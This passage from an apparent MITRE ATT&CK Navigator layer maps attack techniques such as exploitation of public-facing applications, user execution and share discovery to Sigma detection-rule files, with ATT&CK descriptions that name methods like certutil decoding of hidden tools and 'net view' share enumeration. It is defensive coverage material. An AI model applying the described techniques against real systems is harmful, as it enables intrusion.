                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_iexpress_execution.yml"
                },
                {
                    "name": "proc_creation_win_regsvr32_dllregisterserver_exec.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_regsvr32_dllregisterserver_exec.yml"
                },
                {
                    "name": "proc_creation_win_rundll32_dllregisterserver.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\process_creation\\proc_creation_win_rundll32_dllregisterserver.yml"
                }
            ]
        },
        {
            "techniqueID": "T1210",
            "score": 4,
            "comment": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_wannacry.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Malware\\WannaCry\\proc_creation_win_malware_wannacry.yml"
                },
                {
                    "name": "win_exchange_cve_2021_42321.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\win_exchange_cve_2021_42321.yml"
                },
                {
                    "name": "web_cve_2023_46214_rce_splunk_enterprise.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-46214\\web_cve_2023_46214_rce_splunk_enterprise.yml"
                },
                {
                    "name": "web_cve_2023_46214_rce_splunk_enterprise_poc.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-46214\\web_cve_2023_46214_rce_splunk_enterprise_poc.yml"
                }
            ]
        },
        {
            "techniqueID": "T1204",
            "score": 2,
            "comment": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary, or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204). For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_snatch_ransomware.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\Snatch\\proc_creation_win_malware_snatch_ransomware.yml"
                },
                {
                    "name": "proc_creation_win_malware_darkside_ransomware.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\DarkSide\\proc_creation_win_malware_darkside_ransomware.yml"
                }
            ]
        },
        {
            "techniqueID": "T1212",
            "score": 1,
            "comment": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. \n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_gallium_iocs.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\TA\\GALLIUM\\proc_creation_win_apt_gallium_iocs.yml"
                }
            ]
        },
        {
            "techniqueID": "T1190",
            "score": 72,
            "comment": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211). \n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
            "metadata": [
                {
                    "name": "web_cve_2010_5278_exploitation_attempt.yml",
                    "value": "sigma\\rules-emerging-threats\\2010\\Exploits\\CVE-2010-5278\\web_cve_2010_5278_exploitation_attempt.yml"
                },
                {
                    "name": "web_cve_2014_6287_hfs_rce.yml",
                    "value": "sigma\\rules-emerging-threats\\2014\\Exploits\\CVE-2014-6287\\web_cve_2014_6287_hfs_rce.yml"
                },
                {
                    "name": "web_cve_2018_13379_fortinet_preauth_read_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\Exploits\\CVE-2018-13379\\web_cve_2018_13379_fortinet_preauth_read_exploit.yml"
                },
                {
                    "name": "web_cve_2018_2894_weblogic_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2018\\Exploits\\CVE-2018-2894\\web_cve_2018_2894_weblogic_exploit.yml"
                },
                {
                    "name": "web_cve_2019_11510_pulsesecure_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Exploits\\CVE-2019-11510\\web_cve_2019_11510_pulsesecure_exploit.yml"
                },
                {
                    "name": "web_cve_2019_19781_citrix_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Exploits\\CVE-2019-19781\\web_cve_2019_19781_citrix_exploit.yml"
                },
                {
                    "name": "web_cve_2019_3398_confluence.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Exploits\\CVE-2019-3398\\web_cve_2019_3398_confluence.yml"
                },
                {
                    "name": "web_cve_2020_0688_exchange_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-0688\\web_cve_2020_0688_exchange_exploit.yml"
                },
                {
                    "name": "web_cve_2020_0688_msexchange.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-0688\\web_cve_2020_0688_msexchange.yml"
                },
                {
                    "name": "win_vul_cve_2020_0688.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-0688\\win_vul_cve_2020_0688.yml"
                },
                {
                    "name": "web_cve_2020_10148_solarwinds_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-10148\\web_cve_2020_10148_solarwinds_exploit.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2020_10189.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-10189\\proc_creation_win_exploit_cve_2020_10189.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2020_1350.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-1350\\proc_creation_win_exploit_cve_2020_1350.yml"
                },
                {
                    "name": "web_cve_2020_14882_weblogic_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-14882\\web_cve_2020_14882_weblogic_exploit.yml"
                },
                {
                    "name": "web_cve_2020_28188_terramaster_rce_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-28188\\web_cve_2020_28188_terramaster_rce_exploit.yml"
                },
                {
                    "name": "web_cve_2020_3452_cisco_asa_ftd.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-3452\\web_cve_2020_3452_cisco_asa_ftd.yml"
                },
                {
                    "name": "web_cve_2020_5902_f5_bigip.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-5902\\web_cve_2020_5902_f5_bigip.yml"
                },
                {
                    "name": "web_cve_2020_8193_8195_citrix_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2020\\Exploits\\CVE-2020-8193\\web_cve_2020_8193_8195_citrix_exploit.yml"
                },
                {
                    "name": "web_cve_2021_20090_2021_20091_arcadyan_router_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\web_cve_2021_20090_2021_20091_arcadyan_router_exploit.yml"
                },
                {
                    "name": "web_cve_2021_2109_weblogic_rce_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-2109\\web_cve_2021_2109_weblogic_rce_exploit.yml"
                },
                {
                    "name": "web_cve_2021_21972_vsphere_unauth_rce_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-21972\\web_cve_2021_21972_vsphere_unauth_rce_exploit.yml"
                },
                {
                    "name": "web_cve_2021_21978_vmware_view_planner_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-21978\\web_cve_2021_21978_vmware_view_planner_exploit.yml"
                },
                {
                    "name": "web_cve_2021_22005_vmware_file_upload.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-22005\\web_cve_2021_22005_vmware_file_upload.yml"
                },
                {
                    "name": "web_cve_2021_22123_fortinet_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-22123\\web_cve_2021_22123_fortinet_exploit.yml"
                },
                {
                    "name": "web_cve_2021_22893_pulse_secure_rce_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-22893\\web_cve_2021_22893_pulse_secure_rce_exploit.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2021_26084_atlassian_confluence.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-26084\\proc_creation_win_exploit_cve_2021_26084_atlassian_confluence.yml"
                },
                {
                    "name": "web_cve_2021_26084_confluence_rce_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-26084\\web_cve_2021_26084_confluence_rce_exploit.yml"
                },
                {
                    "name": "web_cve_2021_26814_wzuh_rce.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-26814\\web_cve_2021_26814_wzuh_rce.yml"
                },
                {
                    "name": "web_cve_2021_26858_iis_rce.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-26858\\web_cve_2021_26858_iis_rce.yml"
                },
                {
                    "name": "web_cve_2021_27905_apache_solr_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-27905\\web_cve_2021_27905_apache_solr_exploit.yml"
                },
                {
                    "name": "web_cve_2021_28480_exchange_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-28480\\web_cve_2021_28480_exchange_exploit.yml"
                },
                {
                    "name": "web_cve_2021_33766_msexchange_proxytoken.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-33766\\web_cve_2021_33766_msexchange_proxytoken.yml"
                },
                {
                    "name": "web_cve_2021_40539_adselfservice.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-40539\\web_cve_2021_40539_adselfservice.yml"
                },
                {
                    "name": "web_cve_2021_40539_manageengine_adselfservice_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-40539\\web_cve_2021_40539_manageengine_adselfservice_exploit.yml"
                },
                {
                    "name": "win_vul_cve_2021_41379.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-41379\\win_vul_cve_2021_41379.yml"
                },
                {
                    "name": "web_cve_2021_41773_apache_path_traversal.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-41773\\web_cve_2021_41773_apache_path_traversal.yml"
                },
                {
                    "name": "web_cve_2021_42237_sitecore_report_ashx.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-42237\\web_cve_2021_42237_sitecore_report_ashx.yml"
                },
                {
                    "name": "web_cve_2021_43798_grafana.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-43798\\web_cve_2021_43798_grafana.yml"
                },
                {
                    "name": "web_cve_2021_44228_log4j.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-44228\\web_cve_2021_44228_log4j.yml"
                },
                {
                    "name": "web_cve_2021_44228_log4j_fields.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-44228\\web_cve_2021_44228_log4j_fields.yml"
                },
                {
                    "name": "web_exchange_proxyshell.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\ProxyShell-Exploit\\web_exchange_proxyshell.yml"
                },
                {
                    "name": "web_sonicwall_jarrewrite_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\VisualDoor-Exploit\\web_sonicwall_jarrewrite_exploit.yml"
                },
                {
                    "name": "web_exchange_exploitation_hafnium.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\TA\\HAFNIUM\\web_exchange_exploitation_hafnium.yml"
                },
                {
                    "name": "web_cve_2022_21587_oracle_ebs.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\CVE-2022-21587\\web_cve_2022_21587_oracle_ebs.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2022_26809_rpcss_child_process_anomaly.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\CVE-2022-26809\\proc_creation_win_exploit_cve_2022_26809_rpcss_child_process_anomaly.yml"
                },
                {
                    "name": "web_cve_2022_27925_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\CVE-2022-27925\\web_cve_2022_27925_exploit.yml"
                },
                {
                    "name": "web_cve_2022_31656_auth_bypass.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\CVE-2022-31656\\web_cve_2022_31656_auth_bypass.yml"
                },
                {
                    "name": "web_cve_2022_31659_vmware_rce.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\CVE-2022-31659\\web_cve_2022_31659_vmware_rce.yml"
                },
                {
                    "name": "web_cve_2022_33891_spark_shell_command_injection.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\CVE-2022-33891\\web_cve_2022_33891_spark_shell_command_injection.yml"
                },
                {
                    "name": "web_cve_2022_36804_atlassian_bitbucket_command_injection.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\CVE-2022-36804\\web_cve_2022_36804_atlassian_bitbucket_command_injection.yml"
                },
                {
                    "name": "web_cve_2022_44877_exploitation_attempt.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\CVE-2022-44877\\web_cve_2022_44877_exploitation_attempt.yml"
                },
                {
                    "name": "web_cve_2022_46169_cacti_exploitation_attempt.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\CVE-2022-46169\\web_cve_2022_46169_cacti_exploitation_attempt.yml"
                },
                {
                    "name": "web_exchange_owassrf_exploitation.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\OWASSRF-Exploit\\web_exchange_owassrf_exploitation.yml"
                },
                {
                    "name": "web_exchange_owassrf_poc_exploitation.yml",
                    "value": "sigma\\rules-emerging-threats\\2022\\Exploits\\OWASSRF-Exploit\\web_exchange_owassrf_poc_exploitation.yml"
                },
                {
                    "name": "proc_creation_lnx_exploit_cve_2023_22518_confluence_java_child_proc.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-22518\\proc_creation_lnx_exploit_cve_2023_22518_confluence_java_child_proc.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2023_22518_confluence_tomcat_child_proc.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-22518\\proc_creation_win_exploit_cve_2023_22518_confluence_tomcat_child_proc.yml"
                },
                {
                    "name": "proxy_exploit_cve_2023_22518_confluence_auth_bypass.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-22518\\proxy_exploit_cve_2023_22518_confluence_auth_bypass.yml"
                },
                {
                    "name": "web_exploit_cve_2023_22518_confluence_auth_bypass.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-22518\\web_exploit_cve_2023_22518_confluence_auth_bypass.yml"
                },
                {
                    "name": "lnx_sshd_exploit_cve_2023_2283_libssh_authentication_bypass.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-2283\\lnx_sshd_exploit_cve_2023_2283_libssh_authentication_bypass.yml"
                },
                {
                    "name": "web_cve_2023_23752_joomla_exploit_attempt.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-23752\\web_cve_2023_23752_joomla_exploit_attempt.yml"
                },
                {
                    "name": "web_cve_2023_25717_ruckus_wireless_admin_exploit_attempt.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-25717\\web_cve_2023_25717_ruckus_wireless_admin_exploit_attempt.yml"
                },
                {
                    "name": "web_cve_2023_27997_pre_authentication_rce.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-27997\\web_cve_2023_27997_pre_authentication_rce.yml"
                },
                {
                    "name": "file_event_win_exploit_cve_2023_34362_moveit_transfer.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-34362-MOVEit-Transfer-Exploit\\file_event_win_exploit_cve_2023_34362_moveit_transfer.yml"
                },
                {
                    "name": "proxy_exploit_cve_2023_43261_milesight_information_disclosure.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-43261\\proxy_exploit_cve_2023_43261_milesight_information_disclosure.yml"
                },
                {
                    "name": "web_exploit_cve_2023_43261_milesight_information_disclosure.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-43261\\web_exploit_cve_2023_43261_milesight_information_disclosure.yml"
                },
                {
                    "name": "proxy_cve_2023_46747_f5_remote_code_execution.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-46747\\proxy_cve_2023_46747_f5_remote_code_execution.yml"
                },
                {
                    "name": "web_cve_2023_46747_f5_remote_code_execution.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-46747\\web_cve_2023_46747_f5_remote_code_execution.yml"
                },
                {
                    "name": "proxy_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-4966\\proxy_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit.yml"
                },
                {
                    "name": "proxy_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit_attempt.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-4966\\proxy_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit_attempt.yml"
                },
                {
                    "name": "web_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-4966\\web_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit.yml"
                },
                {
                    "name": "web_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit_attempt.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-4966\\web_exploit_cve_2023_4966_citrix_sensitive_information_disclosure_exploit_attempt.yml"
                },
                {
                    "name": "proc_creation_win_exploit_other_win_server_undocumented_rce.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\Windows-Server-Unknown-Exploit\\proc_creation_win_exploit_other_win_server_undocumented_rce.yml"
                }
            ]
        },
        {
            "techniqueID": "T1203",
            "score": 9,
            "comment": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
            "metadata": [
                {
                    "name": "proc_creation_win_exploit_cve_2017_0261.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Exploits\\CVE-2017-0261\\proc_creation_win_exploit_cve_2017_0261.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2017_11882.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Exploits\\CVE-2017-11882\\proc_creation_win_exploit_cve_2017_11882.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2017_8759.yml",
                    "value": "sigma\\rules-emerging-threats\\2017\\Exploits\\CVE-2017-8759\\proc_creation_win_exploit_cve_2017_8759.yml"
                },
                {
                    "name": "file_event_win_cve_2021_31979_cve_2021_33771_exploits.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\file_event_win_cve_2021_31979_cve_2021_33771_exploits.yml"
                },
                {
                    "name": "registry_set_cve_2021_31979_cve_2021_33771_exploits.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\registry_set_cve_2021_31979_cve_2021_33771_exploits.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2021_26857_msexchange.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-26857\\proc_creation_win_exploit_cve_2021_26857_msexchange.yml"
                },
                {
                    "name": "file_event_win_cve_2021_26858_msexchange.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Exploits\\CVE-2021-26858\\file_event_win_cve_2021_26858_msexchange.yml"
                },
                {
                    "name": "proc_creation_win_exploit_cve_2023_38831_winrar_child_proc.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-38831\\proc_creation_win_exploit_cve_2023_38831_winrar_child_proc.yml"
                },
                {
                    "name": "net_connection_win_dfsvc_suspicious_ip.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\network_connection\\net_connection_win_dfsvc_suspicious_ip.yml"
                }
            ]
        },
        {
            "techniqueID": "T1135",
            "score": 2,
            "comment": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.",
            "metadata": [
                {
                    "name": "proc_creation_win_apt_turla_commands_critical.yml",
                    "value": "sigma\\rules-emerging-threats\\2014\\TA\\Turla\\proc_creation_win_apt_turla_commands_critical.yml"
                },
                {
                    "name": "proc_creation_win_malware_dridex.yml",
                    "value": "sigma\\rules-emerging-threats\\2019\\Malware\\Dridex\\proc_creation_win_malware_dridex.yml"
                }
            ]
        },
        {
            "techniqueID": "T1140",
            "score": 4,
            "comment": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)",
            "metadata": [
                {
                    "name": "proc_creation_win_malware_blackbyte_ransomware.yml",
                    "value": "sigma\\rules-emerging-threats\\2021\\Malware\\BlackByte\\proc_creation_win_malware_blackbyte_ransomware.yml"
                },
                {
                    "name": "proc_creation_lnx_apt_unc4841_openssl_connection.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\UNC4841-Barracuda-ESG-Zero-Day-Exploitation\\proc_creation_lnx_apt_unc4841_openssl_connection.yml"
                },
                {
                    "name": "proc_creation_lnx_apt_unc4841_wget_download_compressed_file_tmep_sh.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\UNC4841-Barracuda-ESG-Zero-Day-Exploitation\\proc_creation_lnx_apt_unc4841_wget_download_compressed_file_tmep_sh.yml"
                },
                {
                    "name": "proc_creation_lnx_apt_unc4841_wget_download_tar_files_direct_ip.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\TA\\UNC4841-Barracuda-ESG-Zero-Day-Exploitation\\proc_creation_lnx_apt_unc4841_wget_download_tar_files_direct_ip.yml"
                }
            ]
        },
        {
            "techniqueID": "T1137",
            "score": 1,
            "comment": "Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)",
            "metadata": [
                {
                    "name": "registry_set_exploit_cve_2023_23397_outlook_reminder_trigger.yml",
                    "value": "sigma\\rules-emerging-threats\\2023\\Exploits\\CVE-2023-23397\\registry_set_exploit_cve_2023_23397_outlook_reminder_trigger.yml"
                }
            ]
        },
        {
            "techniqueID": "T1113",
            "score": 1,
            "comment": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware)\n",
            "metadata": [
                {
                    "name": "image_load_dll_system_drawing_load.yml",
                    "value": "sigma\\rules-threat-hunting\\windows\\image_load\\image_load_dll_system_drawing_load.yml"
                }
            ]
        },
        {
            "techniqueID": "T1112",
            "score": 6,
